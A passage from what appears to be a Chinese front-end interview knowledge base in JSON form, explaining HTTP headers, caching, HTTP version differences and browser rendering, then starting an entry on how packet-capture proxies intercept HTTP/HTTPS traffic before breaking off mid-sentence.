**Cache-Control**：告诉浏览器或其他客户，什么环境可以安全的缓存文档  \n> **Last-Modified**：请求资源的最后修改时间  \n> **Expires**：应该在什么时候认为文档已经过期,从而不再缓存它  \n> **Max-age**：客户端的本地资源应该缓存多少秒，开启了`Cache-Control`后有效  \n> **ETag**：请求变量的实体标签的当前值  \n> **Set-Cookie**：设置和页面关联的`cookie`，服务器通过这个头部把`cookie`传给客户端  \n> **Keep-Alive**：如果客户端有`keep-alive`，服务端也会有响应（如timeout=38）  \n> **Server**：服务器的一些相关信息\n\n一般来说，请求头部和响应头部是匹配分析的。  \n譬如，请求头部的`Accept`要和响应头部的`Content-Type`匹配，否则会报错。  \n譬如，跨域请求时，请求头部的`Origin`要匹配响应头部的`Access-Control-Allow-Origin`，否则会报跨域错误。  \n譬如，在使用缓存时，请求头部的`If-Modified-Since`、`If-None-Match`分别和响应头部的`Last-Modified`、`ETag`对应。\n\n**`注意点`**：\n\n请求头 和 响应头 中的 `Content-Type` ，是不一样的。\n\n**请求头的Content-Type常见取值：**\n\n```javascript\napplication/x-www-form-urlencoded  //以键值对的数据格式提交\nmultipart/form-data //用于上传文件图片等二进制数据\n```\n\n**响应头的Content-Type常见取值：**\n\n```javascript\ntext/html // body 数据格式是 HTML\ntext/css  // body 数据格式是 CSS\napplication/javascript // body 数据格式是 JavaScript\napplication/json //body 数据格式是 JSON （最常见的）\n```\n\n### 4\\. 请求/响应体\n\nhttp 请求 时，除了头部，还有`消息实体`，一般来说，  \n请求实体中会将一些需要的参数都放入（用于`post`请求）。  \n比如实体中可以放参数的序列化形式（`a=1&b=2`这种），或者直接放表单对象（`Form Data` 对象，上传时可以夹杂参数以及文件）等等。\n\n而一般 **响应实体**中，就是放服务端需要返给客户端的内容。  \n一般现在的接口请求时，实体中就是信息的json格式，而像页面请求这种，里面直接放了一个html字符串，然后浏览器自己解析并渲染。\n\n如下图所示（post请求发送给接口的数据）\n\n![在这里插入图片描述](https://static.ecool.fun//article/0032c9d3-f40d-4665-a723-e270ce335789.)\n\n**`注意点`**：\n\n1.  **不是所有的HTTP请求都必须带有请求体，像`GET请求`通常不需要发送请求体。**\n2.  **响应完成之后怎么办？TCP 连接就断开了吗？**\n\n> 不一定。这时候要判断Connection字段, 如果请求头或响应头中包含`Connection: Keep-Alive`，  \n> 表示建立了`持久连接`，这样TCP连接会一直保持，之后请求统一站点的资源会复用这个连接。否则断开TCP连接, 请求-响应流程结束。\n\n### 5\\. cookie以及优化\n\ncookie是浏览器的一种本地存储方式，一般用来帮助 **客户端** 和 **服务端** 通信的，常用来进行身份校验，结合服务端的 **session** 使用。\n\n场景如下（简述）：\n\n> 在登陆页面，用户登陆了  \n> 此时，服务端会生成一个`session`，`session`中有对应用户的信息（如用户名、密码等）  \n> 然后会有一个`sessionid`（相当于是服务端的这个session对应的key）  \n> 然后服务端在登录页面中写入`cookie`，值就是: jsessionid=xxx  \n> 然后浏览器本地就有这个`cookie`了，以后访问`同域名`下的页面时，自动带上cookie，自动检验，在有效时间内无需二次登陆。\n\n一般来说，cookie是不允许存放敏感信息的（千万不要明文存储用户名、密码），因为非常不安全，如果一定要强行存储，首先，一定要在cookie中设置`httponly`（这样就无法通过js操作了），另外可以考虑RSA等非对称加密（因为实际上，浏览器本地也是容易被攻克的，并不安全）  \n另外，由于在同域名的资源请求时，浏览器会默认带上本地的cookie，针对这种情况，在某些场景下是需要优化的。\n\n比如以下场景：\n\n> 客户端在 **域名A** 下有cookie（这个可以是登录时由服务端写入的）  \n> 然后在 **域名A** 下有一个页面，页面中有很多依赖的静态资源（都是 **域名A** 的，譬如有20个静态资源）  \n> 此时就有一个问题，页面加载，请求这些静态资源时，浏览器会默认带上 **cookie**  \n> 也就是说，这20个静态资源的 **http请求**，每一个都得带上 **cookie**，而实际上静态资源并不需要 cookie 验证  \n> 此时就造成了较为严重的浪费，而且也降低了访问速度（因为内容更多了）\n\n针对这种场景，是有优化方案的（`多域名拆分`）。具体做法就是：\n\n-   将静态资源分组，分别放到不同的域名下（如`static.base.com`）\n-   而 `page.base.com`（页面所在域名）下请求时，是不会带上 `static.base.com` 域名的cookie的，所以就避免了浪费\n\n说到了多域名拆分，这里再提一个问题，那就是：\n\n-   在移动端，如果请求的域名数过多，会降低请求速度（因为域名整套解析流程是很耗费时间的，而且移动端一般带宽都比不上pc）\n-   此时就需要用到一种优化方案：`dns-prefetch`（让浏览器空闲时提前解析dns域名，不过也请合理使用，勿滥用）\n\n关于cookie的交互，可以看下图总结  \n![在这里插入图片描述](https://static.ecool.fun//article/44023d0d-3e53-4cc1-bae8-e9cda0bf3487.)\n\n### 6\\. HTTP协议各版本的区别\n\nHTTP协议的版本历经多次更新迭代，主要包括 `HTTP/1.0`、`HTTP/1.1`和`HTTP/2`等版本，它们之间的主要区别如下：\n\n**1）HTTP/1.0：**\n\n1.  浏览器与服务器只保持`短连接`，浏览器的每次请求都需要与服务器建立一个TCP连接，都要经过三次握手，四次挥手。而且是串行请求。\n2.  由于浏览器必须等待响应完成才能发起下一个请求，造成 `“队头阻塞”`。  \n    如果某请求一直不到达，那么下一个请求就一直不发送。（高延迟–带来页面加载速度的降低）\n\n**2）HTTP/1.1：目前使用最广泛的版本**\n\n1.  支持`长连接`，通过`Connection: keep-alive`保持HTTP连接不断开，避免重复建立TCP连接。\n2.  支持 `管道化传输`，通过长连接实现一个TCP连接中同时处理多个HTTP请求；只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以减少整体的响应时间。  \n    服务器会按照请求的顺序去返回响应的内容，**无法存在并行响应**。（http请求返回顺序按照服务器响应速度来排序，这里也会引入promise.then 和 async await 来控制接口请求顺序）\n3.  新增了一些请求方法，新增了一些请求头和响应头（如下）\n4.  支持`断点续传`， 新增 Range 和 Content-Range 头表示请求和响应的部分内容\n5.  加入缓存处理（响应头新字段Expires、Cache-Control）\n6.  增加了重要的头 `Host` 字段；为了支持多虚拟主机的场景，使用同一个IP地址上可以托管多个域名，访问的都是同一个服务器，从而满足HTTP协议发展所需要的更高级的特性。\n7.  并且添加了其他请求方法：put、delete、options…\n\n缺点：\n\n1.  队头阻塞\n2.  无状态通信模型（巨大的HTTP头部），也就是服务器端不保存客户端请求的任何状态信息。这样会造成一些需求频繁交互的应用程序难以实现，需要通过其他机制来保证状态的一致性等。\n3.  明文传输–不安全\n4.  不支持服务端推送\n\n**3）HTTP/2.0：**\n\n1.  采用`二进制格式`而非文本格式\n2.  `多路复用`，在同一个TCP连接上同时传输多条消息；每个请求和响应都被分配了唯一的标识符，称为“流（Stream）”，这样每条信息就可以独立地在网络上传输。\n3.  使用 HPACK 算法`报头压缩`，降低开销。\n4.  `服务器推送`，支持服务器主动将相关资源预测性地推送给客户端，以减少后续的请求和延迟。（例如 HTML、CSS、JavaScript、图像和视频等文件）\n\n**4）HTTP3.0**\n\n是 HTTP/3 中的底层支撑协议，该协议基于 UDP，又取了 TCP 中的精华，实现了即快又可靠的协议。\n\n> 1.  运输层由TCP改成使用UDP传输\n> 2.  队头堵塞问题的解决更为彻底\n> 3.  切换网络时的连接保持：基于TCP的协议，由于切换网络之后，IP会改变，因而之前的连接不可能继续保持。而基于UDP的QUIC协议，则可以内建与TCP中不同的连接标识方法，从而在网络完成切换之后，恢复之前与服务器的连接\n> 4.  升级新的压缩算法\n\n注意： **HTTP 1.1起支持长连接，keep-alive不会永远保持，它有一个持续时间，一般在服务器中配置（如apache），另外长连接需要客户端和服务器都支持时才有效。**\n\n**管道传输和多路复用的区别**\n\n> HTTP/2 的多路复用可以理解为一条公路上同时行驶多辆车的场景，每辆车对应一个请求或响应，而公路对应一个 TCP 连接。  \n> 在 HTTP/1.x 中，只能一辆车（请求或响应）通过这条公路，其他车必须等待前面的车通过后再行驶；  \n> 而在 HTTP/2 中，则允许多辆车同时在这条公路上行驶，它们之间不会互相干扰或阻塞，从而提高了公路的使用效率和通行能力。\n\n关于HTTP协议这部分感兴趣的可以看 [HTTP的前世今生  \n](https://coolshell.cn/articles/19840.html \"https://coolshell.cn/articles/19840.html\")\n\n* * *\n\n## 六、单独拎出来的缓存问题，HTTP缓存策略\n\n**浏览器缓存的特点：**\n\n-   浏览器每次发起请求，都会`先在浏览器缓存中查找该请求的结果以及缓存标识`\n-   浏览器每次拿到返回的请求结果都会`将该结果和缓存标识存入浏览器缓存中`\n\n根据是否需要向服务器重新发起HTTP请求将缓存过程分为两个部分，分别是`强缓存`和`协商缓存`。\n\n1.  **强缓存**：使用强缓存策略时，如果缓存资源在`过期时间`内，是的话直接从本地缓存中读取资源，不与服务器进行通信。常见的缓存控制字段有`Expires`和`Cache-Control`。注意，**如果同时启用了Cache-Control与Expires，Cache-Control优先级高。**\n2.  **协商缓存**：如果强缓存失效后，客户端将向服务器发出请求，进行协商缓存。浏览器携带上一次请求返回的响应头中的 **缓存标识** 向服务器发起请求（如ETag、Last-Modified等），由服务器判断资源是否更新。如果`资源没有更新`，则返回状态码 `304` Not Modified，告诉浏览器可以使用本地缓存；否则返回新的资源内容。`强缓存优先级高于协商缓存`，但是协商缓存可以更加灵活地控制缓存的有效性。\n\n* * *\n\n## 七、页面渲染流程\n\n### 1\\. 流程简述\n\n浏览器内核拿到内容后，渲染步骤大致可以分为以下几步：\n\n> 1）**解析HTML:** 解析 **`HTML`** 并构建 **`DOM`** 树。  \n> 2）**解析CSS**: 解析 **`CSS`** 构建 **`CSSOM`** 树（样式树）。  \n> 3）**合成渲染树**：将 **`DOM`** 与 **`CSSOM`** 合并成一个 **`渲染树`**（Render Tree） 。  \n> 4）**布局计算**：根据渲染树的结构，计算`每个节点`在屏幕上的`大小`、`位置`等属性，生成布局信息（Layout）。这个过程会发生回流和重绘。  \n> 5）**绘制页面**：将生成的布局信息交给浏览器的绘图引擎，通过 **`GPU`** 加速将像素绘制（Paint）到屏幕上。  \n> 6）**浏览器回流和重绘**：如果页面发生改变，浏览器需要重新计算布局和绘制，这可能会导致性能问题。因此我们应尽量避免频繁的 DOM 操作和调整元素样式，以减少不必要的回流和重绘。\n\n### 2\\. 解析HTML，构建DOM树\n\n> **解析过程中遇到 CSS 解析 CSS，遇到 JS 执行 JS。为了提高解析效率，浏览器在开始解析前，会启动一个预解析的线程，率先下载 HTML 中的外部 CSS 文件和 外部的 JS 文件。  \n> 如果主线程解析到`link`位置，此时外部的 CSS 文件还没有下载解析好，主线程不会等待，继续解析后续的 HTML。这是因为下载和解析 CSS 的工作是在预解析线程中进行的。这就是 CSS 不会阻塞 HTML 解析的根本原因。  \n> 如果主线程解析到`script`位置，会停止解析 HTML，转而等待 JS 文件下载好，并将全局代码解析执行完成后，才能继续解析 HTML。这是因为 JS 代码的执行过程可能会修改当前的 DOM 树，所以 DOM 树的生成必须暂停。这就是 JS 会阻塞 HTML 解析的根本原因。**\n\n浏览器会遵守一套步骤将 HTML 文件转换为 DOM 树。宏观上，可以分为几个步骤：  \n![在这里插入图片描述](https://static.ecool.fun//article/3831277d-a542-44b4-9336-65f5dd0e9c2c.)  \n浏览器从磁盘或网络读取HTML的原始字节，并根据文件的指定编码（例如UTF-8）将它们转换成字符串。\n\n> 在网络中传输的内容其实都是0和1这些字节数据。当浏览器接收到这些字节数据以后，它会将这些数据转换为字符串，就是我们的代码。\n\n比如假设有这样一个HTML页面：（以下部分的内容出自参考来源，修改了下格式）\n\n```html\n<html>\n  <head>\n    <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n    <link href=\"style.css\" rel=\"stylesheet\">\n    <title>Critical Path</title>\n  </head>\n  <body>\n    <p>Hello <span>web performance</span> students!</p>\n    <div><img src=\"awesome-photo.jpg\"></div>\n  </body>\n</html>\n```\n\n浏览器的处理过程如下：（以下图片出自参考来源）\n\n![在这里插入图片描述](https://static.ecool.fun//article/c7463010-e56d-4fb8-8354-43f0ff98dee1.)\n\n> **注意点：**\n> \n> 1.  将字符串转换成Token，例如：`<html>`、`<head>`、`<body>`等。**Token中会标识出当前Token是 “开始标签” 或是 “结束标签” 亦或是 “文本” 等信息。**\n> 2.  构建DOM的过程中，不是等所有Token都转换完成后再去生成节点对象，而是一边生成Token，一边消耗Token来生成节点对象。换句话说，每个Token被生成后，会立刻消耗这个Token创建出节点对象。**注意：带有结束标签标识的Token不会再去创建节点对象。**\n\n### 3\\. 解析CSS，构建CSSOM树\n\n构建 CSSOM 树的过程与 构建DOM 的过程非常相似，当浏览器接收到一段CSS，浏览器首先要做的是识别出Token，然后 构建节点 并生成 CSSOM。简述为：\n\n![在这里插入图片描述](https://static.ecool.fun//article/cde61bdd-5719-4890-8bcd-47c0e9088e50.)\n\n这一过程中，CSS匹配HTML元素是一个相当复杂和有性能问题的事情，浏览器得递归CSSOM树，确定每一个节点的样式到底是什么，所以DOM树要小，CSS尽量用id和class，千万不要过度层叠下去。\n\n### 4\\. 合成渲染树（样式计算）\n\n当我们生成 DOM 树和 CSSOM 树以后，就需要将这两棵树组合为 渲染树。  \n（以下图片出自参考来源）\n\n![在这里插入图片描述](https://static.ecool.fun//article/d36c12e7-aeeb-4b14-9b2d-f47db52c9814.)  \n在这一过程中，不是简单的将两者合并就行了。**渲染树只会包括需要显示的节点和这些节点的样式信息，如果某个节点是`display: none`的，那么就不会在渲染树中显示**。\n\n> 主线程会遍历得到的 DOM 树，依次为树中的每个节点计算出它最终的样式，称之为 Computed Style。  \n> 在这一过程中，很多预设值会变成绝对值，比如`red`会变成`rgb(255,0,0)`；相对单位会变成绝对单位，比如`em`会变成`px`  \n> 这一步完成后，会得到一棵带有样式的 DOM 树。\n\n### 5\\. 布局\n\n布局完成后会生成布局树。  \n当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做 **`回流`** ）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切 **`位置和大小`**。通常这一行为也被称为“自动重排”。\n\n布局流程的输出是一个“盒模型”，它会精确地捕获每个元素在视口内的确切位置和尺寸，所有相对测量值都将转换为屏幕上的绝对像素。\n\n> 布局阶段会依次遍历 DOM 树的每一个节点，**计算每个节点的几何信息**。例如节点的宽高、相对包含块的位置。  \n> 大部分时候，**DOM 树和布局树并非一一对应**。  \n> 比如 `display:none` 的节点没有几何信息，因此不会生成到布局树；又比如使用了 `伪元素选择器`，虽然 DOM 树中不存在这些伪元素节点，但它们拥有几何信息，所以会生成到布局树中。还有匿名行盒、匿名块盒等等都会导致 DOM 树和布局树无法一一对应。\n\n下图采用网上老师的图片展示一下，更容易理解。  \n![在这里插入图片描述](https://static.ecool.fun//article/f9967398-d183-4e43-b4b3-e466a0f2dd57.)\n\n![在这里插入图片描述](https://static.ecool.fun//article/b499a996-0d1c-4537-8339-e57cc16d6388.)\n\n### 6\\. 分层\n\n主线程会使用一套复杂的策略对整个布局树中进行分层。  \n分层的好处在于，**将来某一个层改变后，仅会对该层进行后续处理，从而提升效率**。  \n滚动条、堆叠上下文、transform、opacity 等样式都会或多或少的影响分层结果，也可以通过`will-change`属性更大程度的影响分层结果。\n\n关于分层我们可以f12查看layers这一项，没有的话，就去浏览器更多工具里打开。  \n![在这里插入图片描述](https://static.ecool.fun//article/adc89d7b-a63e-4186-8d5e-36f41a5372ff.)\n\n### 7\\. 绘制\n\n主线程会为每个层单独产生绘制指令集，用于描述这一层的内容该如何画出来。  \n完成绘制后，主线程将每个图层的绘制信息提交给合成线程，剩余工作将由合成线程完成。  \n合成线程首先对每个图层进行分块，将其划分为更多的小区域。  \n它会从线程池中拿取多个线程来完成分块工作。\n\n下图采用网上老师的图片展示一下，更容易理解。  \n![在这里插入图片描述](https://static.ecool.fun//article/5e3d6250-6b70-4265-8c94-f93bc9de5b09.)  \n![在这里插入图片描述](https://static.ecool.fun//article/d2160b1b-0798-47de-af2b-d40aa87515e9.)\n\n### 6\\. 浏览器回流和重绘\n\n**（1）回流**  \n回流 的本质就是重新计算 `layout 树`。  \n当进行了会影响布局树的操作后，需要重新计算布局树，会引发 layout。  \n为了避免连续的多次操作导致布局树反复计算，浏览器会合并这些操作，当 JS 代码全部完成后再进行统一计算。所以，改动属性造成的 回流 是`异步`完成的。\n\n也同样因为如此，当 JS 获取布局属性时，就可能造成无法获取到最新的布局信息。  \n浏览器在反复权衡下，最终决定获取属性（比如 dom.clientWidth）立即 回流。\n\n**（2）重绘**  \n重绘 的本质就是重新根据分层信息计算了`绘制`指令。  \n当改动了可见样式后，就需要重新计算，会引发 重绘。  \n**由于元素的布局信息也属于可见样式，所以 回流 一定会引起 重绘。**\n\n**（3）最后总结**\n\n-   **回流**（也叫重排）：当 DOM结构发生变化 或者 元素样式 发生改变时，浏览器需要重新计算样式和渲染树，这个过程比较消耗性能。\n-   **重绘**：指元素的外观样式发生变化（比如改变 背景色，边框颜色，文字颜色color等 ），但是布局没有变，此时浏览器只需要应用新样式绘制元素就可以了，比回流消耗的性能小一些。\n\n**`回流必定会发生重绘，重绘却可以单独出现`** 。回流的成本开销要高于重绘，而且一个节点的回流往往回导致子节点以及同级节点的回流， 所以优化方案中一般都包括，尽量避免回流。\n\n总之，对元素执行回流操作之后，还有可能引起`重绘`或者`合成`操作，形象地理解就是“`牵一发而动全身`”。\n\n**（4）什么情况引起回流？**\n\n> 1.  页面的首次渲染\n> 2.  浏览器的窗口大小发生变化\n> 3.  元素内容发生变化\n> 4.  元素的尺寸或位置发生变化\n> 5.  元素的字体大小发生变化\n> 6.  添加或删除可见的DOM元素\n> 7.  激活CSS伪类\n> 8.  查询某些属性或者调用某些方法\n\n所以一般会有一些优化方案，如：\n\n-   **使用 CSS 动画代替 JavaScript 动画**：CSS 动画利用 GPU 加速，在性能方面通常比 JavaScript 动画更高效。使用 CSS 的`transform` 和 `opacity` 属性来创建动画，而不是改变元素的布局属性，如宽度、高度等。\n-   **使用 translated3d 开启硬件加速**：将元素的位移属性设置为 translated3d( 0,0,0 )，可以强制使用 GPU 加速。有助于避免回流，并提高动画流畅度。\n-   **避免频繁操作影响布局的样式属性**：当需要对元素进行多次样式修改时，可以考虑将这些修改合并为一次操作。通过添加/移除 css类来一次性改变多个样式属性，而不是逐个修改。\n-   **使用 requestAnimationFrame**：通过使用 requestAnimationFrame 方法调度动画帧，可以确保动画在浏览器的重绘周期内执行，从而避免不必要的回流。这种方式可确保动画在最佳时间点进行渲染。\n-   **使用文档片段（Document Fragment）** ：当需要在 DOM 中插入大量新元素时，可以先将这些元素添加到文档片段中，然后再将整个文档片段一次性插入到 DOM 中。这样可以减少回流和重绘的次数。（vue 虚拟dom的做法）\n-   **使元素脱离文档流**：`position: absolute`/`position: fixed`/`float:left`（只是减少回流，不是避免回流）\n-   **使用 visibility:hidden 代替 display: none** ：visibility:hidden不会触发回流，因为元素仍然占据空间，只是不可见。而 display: none 会将元素从渲染树中移除，引起回流。\n\n**`注意：改变字体大小会引发回流。`**\n\n**浏览器渲染小结：**  \n整个过程如下：\n\n> **DOM TREE**（DOMContentLoaded事件触发） => 「执行JS」没完成会阻止接下来的渲染 => **CSSOM TREE** => **RENDER TREE渲染树**「浏览器未来是按照这个树来绘制页面的」=> **Layout布局计算**「回流/重排」=> **Painting绘制**「重绘」{ 分层绘制 }\n\n**需要注意几个事项：**\n\n> **1\\. CSSOM会阻塞渲染，只有当CSSOM构建完毕后才会进入下一个阶段构建渲染树。（这点与浏览器优化有关，防止css规则不断改变，避免了重复的构建）**  \n> **2\\. 通常情况下DOM和CSSOM是并行构建的，但是当浏览器遇到一个script标签时，DOM构建将暂停，直至JS脚本下载完成并执行后才会继续解析HTML。因为 JavaScript 可以使用诸如 document.write() 更改整个 DOM 结构之类的东西来更改文档的形状，因此 HTML 解析器必须等待 JavaScript 运行才能恢复HTML文档解析。**  \n> **3\\. 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，建议将 script 标签放在 body 标签底部。**  \n> **4\\. 如果主线程解析到`link`位置，此时外部的 CSS 文件还没有下载解析好，主线程不会等待，继续解析后续的 HTML。这是因为下载和解析 CSS 的工作是在预解析线程中进行的。这就是 CSS 不会阻塞 HTML 解析的根本原因。**",
    "testPoint": "浏览器渲染过程中，**网络层面**的考察重点主要集中在从用户输入 URL 到页面渲染完成之间的网络通信过程。这个环节涉及多个关键阶段，是前端性能优化、资源加载、安全和协议理解的核心。\n\n## 一、从输入 URL 到页面渲染的网络流程（宏观流程）\n\n1. **DNS 解析**\n\n   * 浏览器如何查找域名的 IP？\n   * 是否存在 DNS 缓存？本地 DNS / 操作系统 / 浏览器级缓存？\n   * 如何减少 DNS 请求？\n\n2. **TCP 连接建立**\n\n   * 三次握手的过程\n   * 建立连接的时机\n   * TCP 连接重用（如 HTTP/1.1 的 Keep-Alive）\n\n3. **TLS/SSL 握手（HTTPS）**\n\n   * HTTPS 建立过程（涉及证书验证、对称加密密钥协商）\n   * 为什么 HTTPS 比 HTTP 慢？\n   * TLS 握手和性能优化（如 TLS 1.3 减少 RTT）\n\n4. **HTTP 请求发送**\n\n   * 请求方法（GET/POST）和状态码\n   * 请求头部（如 Cookie、User-Agent、Accept-Encoding 等）\n   * 请求体的构造\n\n5. **服务器响应**\n\n   * 响应码（200、304、404、500…）\n   * 响应头（Content-Type、Cache-Control、Set-Cookie…）\n   * 响应体（HTML、JS、CSS、图片等）\n\n6. **内容传输**\n\n   * 是否启用了压缩（如 gzip/br）\n   * 分块传输（Transfer-Encoding: chunked）\n   * Range 请求、断点续传\n\n7. **连接关闭或复用**\n\n   * HTTP1.1 中的 Keep-Alive\n   * HTTP/2 的多路复用（连接复用机制）\n\n## 二、关键协议层考察点\n\n### 1. **DNS 相关**\n\n* DNS 解析过程、递归查询、权威解析器\n* `DNS Prefetch`、`Preconnect` 优化手段\n* 使用 CDN 时的 DNS 解析流程\n\n### 2. **HTTP 协议细节**\n\n* HTTP1.0 vs HTTP1.1 vs HTTP2 vs HTTP3\n* 请求/响应头详解\n* 连接管理、流水线机制、队头阻塞（HTTP1.1）问题\n* HTTP 缓存机制（协商缓存 & 强缓存）\n\n### 3. **HTTPS 及 TLS**\n\n* TLS 1.2 / 1.3 的握手流程\n* CA 证书信任体系\n* HSTS、OCSP Stapling、安全配置\n\n## 三、网络性能优化相关考点\n\n* 如何减少网络请求？\n* 如何优化 DNS 查询？\n* 如何利用缓存减少加载时间？\n* TCP/TLS 握手成本如何优化？\n* 使用 CDN 的原理和优势\n* 静态资源压缩与合并（如 JS/CSS/images）\n* 资源预加载策略：`<link rel=\"preload\">`、`prefetch`、`dns-prefetch` 等\n\n## 四、资源加载相关\n\n* 浏览器加载静态资源的顺序？\n* JS/CSS 加载是否阻塞渲染？\n* `defer` 和 `async` 的区别\n* 图片懒加载、字体加载策略\n* Service Worker 的作用与资源拦截能力\n\n## 五、安全相关\n\n* Mixed Content（HTTPS 页面加载 HTTP 资源）问题\n* HSTS 强制使用 HTTPS\n* CORS 跨域通信过程\n* CSP（内容安全策略）防止 XSS 注入\n\n## 六、面试常见问题\n\n1. 浏览器从输入 URL 到页面显示，网络阶段都做了什么？\n2. TCP 三次握手、四次挥手过程？\n3. HTTPS 是如何建立安全连接的？\n4. HTTP/2 如何实现多路复用？\n5. 如何通过缓存优化首屏加载时间？\n6. DNS 查询过程是怎样的？如何优化？\n7. HTTP 状态码中，301、302、304 各代表什么？\n8. 如何避免 DNS 重复解析？\n9. 浏览器对静态资源请求做了哪些优化？\n10. 如何配置服务器响应头以实现资源缓存策略？\n\n\n| 模块       | 关注点                        |\n| -------- | -------------------------- |\n| DNS      | 查询过程、缓存策略、CDN 影响           |\n| TCP/TLS  | 握手流程、连接复用、性能影响             |\n| HTTP 协议  | 各版本特性、缓存机制、状态码             |\n| HTTPS 安全 | 证书验证、加密机制、防中间人攻击           |\n| 资源加载与性能  | 压缩、缓存、连接优化、加载顺序、预加载策略      |\n| 安全与跨域    | CORS、HSTS、CSP、Cookie 安全属性等 |\n\n",
    "exerciseKeyList": "[\"61b47ff6-9c4d-4fa2-b126-dc5ffff3e7c6\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T07:33:50.000Z",
    "updateAt": "2025-08-04T02:19:42.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "61b47ff6-9c4d-4fa2-b126-dc5ffff3e7c6",
        "title": "简述 html 页面渲染过程",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T07:08:18.000Z",
        "updateAt": "2024-08-10T21:35:30.000Z"
      }
    ]
  },
  "251": {
    "id": 251,
    "tagId": 16,
    "title": "抓包工具",
    "explanation": "## 抓包的原理\n\n### 什么是抓包？\n\n抓包就是将网络传输发送与接收的数据包进行截获、重发、编辑、转存等操作，通过抓包可以：\n\n-   分析网络问题\n    \n-   业务分析\n    \n-   分析网络信息流通量\n    \n-   网络大数据金融风险控制\n    \n-   探测企图入侵网络的攻击\n    \n-   探测由内部和外部的用户滥用网络资源\n    \n-   探测网络入侵后的影响\n    \n-   监测链接互联网宽频流量\n    \n-   监测网络使用流量（包括内部用户，外部用户和系统）\n    \n-   监测互联网和用户电脑的安全状态\n    \n-   渗透与欺骗\n    \n-   ...\n    \n\n回顾下计算机网络知识，数据在网络上是以很小的`帧`的单位传输的，帧通过特定的称为网络驱动程序的程序进行成型，然后通过网卡发送到网线上，通过网线到达目的机器，在目的机器的一端执行相反的过程。接收端机器的以太网捕获到这些帧，并告诉操作系统帧已到达，然后对其进行存储。在这个传输和接收的过程，就可以使用抓包工具（Sniffers）进行抓包，作为前端开发者，通常是抓取应用层的 HTTP/HTTPS 的包。\n\n![image.png](https://static.ecool.fun//article/276de3f5-e999-4225-953b-512747e94988.awebp)\n\n### HTTP/HTTPS 抓包原理\n\nHTTP/HTTPS 是应用层使用的通信协议，常见的应用层体系结构是客户端-服务器体系。\n\n对运行在不同端系统上的客户端程序和服务端程序是如何互相通信的么？实际上，在操作系统上的术语中，进行通信的实际上是`进程`而不是程序，一个进程可以被认为是运行在端系统中的一个程序。\n\n在 web 应用程序中，一个客户浏览器进程与一台服务器进程进行会话交换报文。\n\n浏览器进程需要知道接收进程的主机地址，以及定义在目的主机中的接收进程的标识符，也就是目的端口。\n\n多数应用程序由通信进程对组成，每对中的两个进程互相发送报文。进程通过一个称为套接字的软件接口向网络发送报文和从网络接收报文。\n\n进程可以类比一座房子，而它的套接字可以是它的门，`套接字`是应用层与运输层之间的端口。\n\n![image.png](https://static.ecool.fun//article/cabc0e45-2b16-4f4f-bded-5695a4caad63.awebp)\n\n知道了两个进程的通信流程，我们要怎么抓包呢？举一个生活中的例子，小明暗恋小雯，于是他写了一封情书，但他有点害羞，找了小雯的好朋友小花帮忙传递情书。这个时候，小花可以负责小雯与小明之间的情书传递，作为中间人，她可以偷偷查看他们的情书内容。\n\n思路就是设置一个中间人进程负责抓包，每次目标进程之间的会话都先与中间人进程通信，再进行转发。\n\n![image.png](https://static.ecool.fun//article/982eff99-bf3e-45c7-8062-89d5fdffc76f.awebp)\n\n#### HTTP 抓包原理\n\n在 http 标准中，没有对通信端身份验证的标准。对于服务器来说，它接收的 HTTP 请求报文只要格式符合规范，就发送响应报文。\n\n对于客户端来说也是如此，它无法校验服务器的身份，比如它连接的 `http://www.jecyu.com` 的主机，但由于中间节点的存在，最终连接的可能是 `http://www.jerry.com` 的主机。\n\n因此，对于 HTTP 抓包，无需做过多的处理，只需要让中间人负责转发客户端和服务端的数据包。\n\n#### HTTPS 抓包原理\n\nHTTP 是明文传输，容易受到中间人攻击，不安全。\n\nHTTPS 语义仍然是 HTTP，只不过是在 HTTP 协议栈中 http 与 tcp 之间插入安全层 `SSL/TSL`。\n\n安全层采用**对称加密的方式加密传输数据和非对称加密的方式来传输对称密钥**，解决 http 数据没有加密、无法验证身份、数据容易纂改三个核心问题。\n\n> HTTP + 加密 + 认证 + 完整性保护 = HTTPS\n\n**其中验证身份问题是通过验证服务器的证书来实现的，证书是第三方组织（CA 证书签发机构）使用数字签名技术管理的**，包括创建证书、存储证书、更新证书、撤销证书。\n\n![image.png](https://static.ecool.fun//article/9dda07b3-68a6-4f7e-b4af-e46d5632952a.awebp)\n\n浏览器连接至一个 HTTPS 网站，服务器发送的不仅仅只是服务器实体证书，而是一个证书链，但不包含根证书，根证书会被内嵌在 Windows, Linux, macOS, Android, iOS 这些操作系统里。\n\n![image.png](https://static.ecool.fun//article/a6adb7d8-c86f-4801-be34-fae4470b0f14.awebp)\n\n在 nginx 是这样配置 https 的：\n\n```js\nserver {\n    listen 443 ssl;\n    server_name yourdomain.com;  // 替换为你的域名\n\n    ssl_certificate /path/to/your/certificate.crt;  // 替换为你的 SSL 证书路径\n    ssl_certificate_key /path/to/your/privatekey.key;  // 替换为你的私钥路径\n\n    // 其他的 Nginx 配置项\n    // ...\n}\n```\n\n其中校验证书分为两步，证书的签发者校验和服务器实体证书校验\n\n1.  证书链校验：\n\n-   1.1 浏览器从服务器实体证书的上一级证书（比如 B 证书）获取公钥，用来校验服务器实体证书的签名（签名是通过 CA 机构的私钥签名的），校验成功则继续，否则证书校验失败。\n    \n-   1.2 浏览器从 B 证书的上一级证书（比如 C 证书）获取公钥，用来校验 B 证书的签名，\n    \n\n校验成功则继续，否则证书校验失败。\n\n-   1.3 浏览器迭代校验每张证书的签名，最后会找到自签名的根证书（签发者和使用者是同一个人），由于浏览器已经集成了根证书，可以充分信任根证书的公钥，完成最后的签名。\n\n2.  服务器实体证书校验：访问的域名信息是否与证书一致、日期、证书扩展校验等。\n\n了解完证书校验后，我们来看看具体的 https 通信流程：\n\n-   首先是 tcp 的三次握手建立连接\n    \n-   接着是非对称加密的握手过程\n    \n    -   client 发送随机数 **random1** + 支持的加密算法集合\n        \n    -   server 收到信息，返回选择的一个加密算法+ 证书 （包含S\\_公钥） + **random2**\n        \n    -   client 验证证书有效性，并用 **random1 + random2** 